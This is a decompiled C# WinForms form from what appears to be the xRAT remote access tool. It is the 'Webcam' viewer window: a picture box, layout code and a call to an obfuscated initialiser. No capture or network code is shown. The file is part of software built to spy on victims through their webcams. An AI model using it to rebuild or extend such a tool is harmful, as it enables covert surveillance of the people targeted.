namespace xRAT
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class WWebcam : Form
    {
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        private IContainer icontainer_0;

        public WWebcam()
        {
            Class1.QaIGh5M7cuigS();
            this.InitializeComponent();
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(WWebcam));
            this.PictureBox1 = new PictureBox();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            this.PictureBox1.Image = (Image) manager.GetObject("PictureBox1.Image");
            Point point = new Point(-2, -3);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            Size size = new Size(0x157, 0x10f);
            this.PictureBox1.Size = size;
            this.PictureBox1.TabIndex = 0;
            this.PictureBox1.TabStop = false;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(340, 0x10c);
            this.ClientSize = size;
            this.Controls.Add(this.PictureBox1);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.Name = "WWebcam";
            this.ShowIcon = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Webcam";
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.ResumeLayout(false);
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox1 = value;
            }
        }
    }
}

